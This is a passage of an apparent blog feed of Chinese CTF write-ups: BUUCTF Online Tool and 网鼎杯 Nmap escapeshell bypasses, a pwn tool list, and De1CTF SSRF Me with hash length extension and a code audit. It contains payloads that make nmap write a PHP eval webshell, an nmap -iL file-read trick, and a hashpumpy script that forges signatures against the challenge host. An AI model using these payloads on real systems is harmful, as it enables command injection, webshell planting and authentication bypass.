= <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，攻击思路，绕过两个escape函数，然后用nmap写后门。均为知识盲区，下方链接可参考。<br>重点在于理解转码之后的字符串，写如文件正好可以被当作php代码执行。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，</span><br><span class="line">这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</span><br></pre></td></tr></table></figure><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line">功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 </span><br><span class="line">此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line">反斜线（\）会在以下字符之前插入：</span><br><span class="line">&amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。 </span><br><span class="line">在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">raw:&#x27; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#x27;</span><br><span class="line">escapeshellarg():</span><br><span class="line">\&#x27; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php \&#x27;         //转义单引号</span><br><span class="line">&#x27;\&#x27;&#x27; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#x27;\&#x27;&#x27;     //在刚转义的单引号前后加单引号进行连接</span><br><span class="line">&#x27;&#x27;\&#x27;&#x27; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#x27;\&#x27;&#x27;&#x27;   //首尾加单引号</span><br><span class="line"></span><br><span class="line">escapeshellcmd():</span><br><span class="line">&#x27;&#x27;\\&#x27;&#x27; \&lt;\?php eval\(\$_POST\[&quot;v&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27; //对所有特殊字符进行转义</span><br><span class="line">最后的输出，成对的单引号都会被当作链接，特殊字符被转移，即为 \ &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php \\</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/weixin_44348894/article/details/105520481?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.opensearchhbase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.opensearchhbase">[BUUCTF 2018]Online Tool（超详细解析payload）</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11532530.html">刷题记录：[BUUCTF 2018]Online Tool</a><br><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">谈escapeshellarg绕过与参数注入漏洞</a><br><a href="https://blog.csdn.net/LYJ20010728/article/details/116902085">利用&#x2F;绕过escapeshellarg&#x2F;escapeshellcmd函数</a><br><a href="https://blog.csdn.net/cunjiu9486/article/details/109075403">nmap输出格式_Nmap输出</a></p><h2 id="网鼎杯-2020-朱雀组-Nmap-绕过escapeshell"><a href="#网鼎杯-2020-朱雀组-Nmap-绕过escapeshell" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"></a>[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell</h2><p>同理，只不过是过滤了关键字 php</p><h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p>同上题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;?= eval($_POST[&#x27;</span>pwd<span class="string">&#x27;]);?&gt; -oG shell.php &#x27;</span></span><br></pre></td></tr></table></figure><h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1<span class="string">&#x27; -iL /flag -oN vege.txt &#x27;</span></span><br><span class="line">最后执行是</span><br><span class="line">nmap 127.0.0.1<span class="string">&#x27; -iL /flag -oN gugu.txt &#x27;</span></span><br><span class="line">-iL是扫描对应文本里的ip，这里读取flag读取失败，将结果输出到gugu.txt</span><br></pre></td></tr></table></figure><p>最后<br>贴一下蚁剑连接之后拿到的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;settings.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>])):</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WEB_SCANS&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Web scans disabled&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$host</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>() . <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10</span>)), <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line"><span class="variable">$command</span> = <span class="string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="string">&quot; -oX &quot;</span> . RESULTS_PATH . <span class="variable">$filename</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$host</span>;</span><br><span class="line"><span class="variable">$result_scan</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$command</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$result_scan</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: result.php?f=&#x27;</span> . <span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/Sentry-fei/p/15671032.html">https://www.cnblogs.com/Sentry-fei/p/15671032.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn tips</title>
      <link href="/2022/04/21/Pwn-tips/"/>
      <url>/2022/04/21/Pwn-tips/</url>
      
        <content type="html"><![CDATA[<p>libc_database :<br><a href="https://libc.rip/">https://libc.rip/</a></p><p>查看程序依赖库： <a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/ldd.html">ldd 查看程序依赖库</a></p><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/index.html">工具参考篇</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> gdb 调试利器</span><br><span class="line"><span class="number">2.</span> ldd 查看程序依赖库</span><br><span class="line"><span class="number">3.</span> lsof 一切皆文件</span><br><span class="line"><span class="number">4.</span> ps 进程查看器</span><br><span class="line"><span class="number">5.</span> pstack 跟踪进程栈</span><br><span class="line"><span class="number">6.</span> strace 跟踪进程中的系统调用</span><br><span class="line"><span class="number">7.</span> ipcs 查询进程间通信状态</span><br><span class="line"><span class="number">8.</span> top linux下的任务管理器</span><br><span class="line"><span class="number">9.</span> free 查询可用内存</span><br><span class="line"><span class="number">10.</span> vmstat 监视内存使用情况</span><br><span class="line"><span class="number">11.</span> iostat 监视I/O子系统</span><br><span class="line"><span class="number">12.</span> sar 找出系统瓶颈的利器</span><br><span class="line"><span class="number">13.</span> readelf elf文件格式分析</span><br><span class="line"><span class="number">14.</span> objdump 二进制文件分析</span><br><span class="line"><span class="number">15.</span> nm 目标文件格式分析</span><br><span class="line"><span class="number">16.</span> size 查看程序内存映像大小</span><br><span class="line"><span class="number">17.</span> wget 文件下载</span><br><span class="line"><span class="number">18.</span> scp 跨机远程拷贝</span><br><span class="line"><span class="number">19.</span> crontab 定时任务</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[De1CTF 2019]SSRF Me-hash拓展攻击</title>
      <link href="/2022/04/21/BUUCTF-WEB-De1CTF-2019-SSRF-Me-hash%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2022/04/21/BUUCTF-WEB-De1CTF-2019-SSRF-Me-hash%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是hash长度拓展攻击？"><a href="#什么是hash长度拓展攻击？" class="headerlink" title="什么是hash长度拓展攻击？"></a>什么是hash长度拓展攻击？</h2><p>不才，懒得看了，只总结一下利用方法。。。详细请看下面的传送门<br><a href="https://xz.aliyun.com/t/2563">哈希长度拓展攻击(Hash Length Extension Attacks)</a></p><h2 id="一般利用条件"><a href="#一般利用条件" class="headerlink" title="一般利用条件"></a>一般利用条件</h2><p>利用特征格式MD5(salt+arg1+arg2)</p><ul><li>salt长度</li><li>hash密文</li></ul><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>在不知道salt的情况下，利用可控参数，伪造hash值，更像是一个欺骗sign</p><h2 id="利用实践"><a href="#利用实践" class="headerlink" title="利用实践"></a>利用实践</h2><p>从上篇我们可以分析得到，我们主要缺的是sign&#x3D;MD5(key+’flag.txt’+’readscan&#x2F;scanread’)，再加上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secert_key = os.urandom(<span class="number">16</span>)<span class="comment">#我们也知道了salt的长度</span></span><br></pre></td></tr></table></figure><p>所以就可以使用hash长度拓展攻击了 。</p><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ul><li>hashpump</li></ul><ol><li><p>生成可以欺骗判断的sign</p><p>首先我们需要获取密文，还是利用&#x2F;geneSign?param&#x3D;flag.txt，获取<br>因为</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span><span class="comment">#这里学习到@app.route这种方式是相当于url定位引导，下面的函数就会直接运行了，很是奇怪，后面遇到大佬再询问询问。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():<span class="comment">#生成默认的action=scan，这里有逻辑漏洞</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>   所以这里生成的是MD5(key+’flag.txt’+’scan’) ，即 41acd9e545d8c216943aa1646219592a<br>   <img src="/2022/04/21/BUUCTF-WEB-De1CTF-2019-SSRF-Me-hash%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2022-04-21-14-25-54.png"></p><pre><code>我们知道我们需要action里面有read，所以进行如下构造</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@:~<span class="comment"># hashpump</span></span><br><span class="line">Input Signature: 41acd9e545d8c216943aa1646219592a</span><br><span class="line">Input Data: scan <span class="comment">#因为上面的hash是MD5(key+&#x27;flag.txt&#x27;+&#x27;scan&#x27;)，所以这里需要写scan，或者说最后n之前都可以写，因为相当于前面的都是key，但是要注意下面的key长度也要修改</span></span><br><span class="line">Input Key Length: 24 <span class="comment">#len(key)+len(&#x27;flag.txt&#x27;)=24</span></span><br><span class="line">Input Data to Add: <span class="built_in">read</span> <span class="comment">#因为要读取所以param里面要有read</span></span><br><span class="line">62e68db42e2b776e05119fea2ef478f3 <span class="comment">#生成的欺骗hash</span></span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read <span class="comment">#注意利用的时候把\x换成%</span></span><br></pre></td></tr></table></figure><ol start="2"><li>攻击<br>将sign换成我们的欺骗sign，action换成欺骗action <code>scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read</code>，<br><img src="/2022/04/21/BUUCTF-WEB-De1CTF-2019-SSRF-Me-hash%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/2022-04-21-14-32-23.png"><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3>hashpumpy<br>@一叶飘零师傅写的脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;local_file:flag.txt&#x27;</span><span class="comment">#同理</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://139.180.128.86/geneSign?param=&#x27;</span>+url)</span><br><span class="line">old_sign = r.content</span><br><span class="line">new_sign = hashpumpy.hashpump(old_sign, url + <span class="string">&#x27;scan&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;sign&#x27;</span>: new_sign[<span class="number">0</span>],</span><br><span class="line"><span class="string">&#x27;action&#x27;</span>: urllib.quote(new_sign[<span class="number">1</span>][<span class="number">19</span>:])</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://139.180.128.86/De1ta?param=&#x27;</span>+url, cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(r.content)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a href="https://github.com/bwall/HashPump">hashpump地址</a><br><a href="https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html">哈希长度扩展攻击 </a><br><a href="https://xz.aliyun.com/t/2563">哈希长度拓展攻击(Hash Length Extension Attacks)</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[De1CTF 2019]SSRF Me-SSRF\代码审计</title>
      <link href="/2022/04/20/BUUCTF-WEB-De1CTF-2019-SSRF-Me-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/04/20/BUUCTF-WEB-De1CTF-2019-SSRF-Me-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>这道题主要学到了flask审计的一些知识。</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):<span class="comment">#执行action</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:<span class="comment">#这里读取文件并不是判断action=read，而是in造成逻辑漏洞</span></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span><span class="comment">#这里学习到@app.route这种方式是相当于url定位引导，下面的函数就会直接运行了，很是奇怪，后面遇到大佬再询问询问。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():<span class="comment">#生成默认的action，这里有逻辑漏洞</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():<span class="comment">#引用task</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):<span class="comment">#返回urlopen()</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>] <span class="comment">#如果没有过滤的话这里可以直接用伪协议读取文件</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):<span 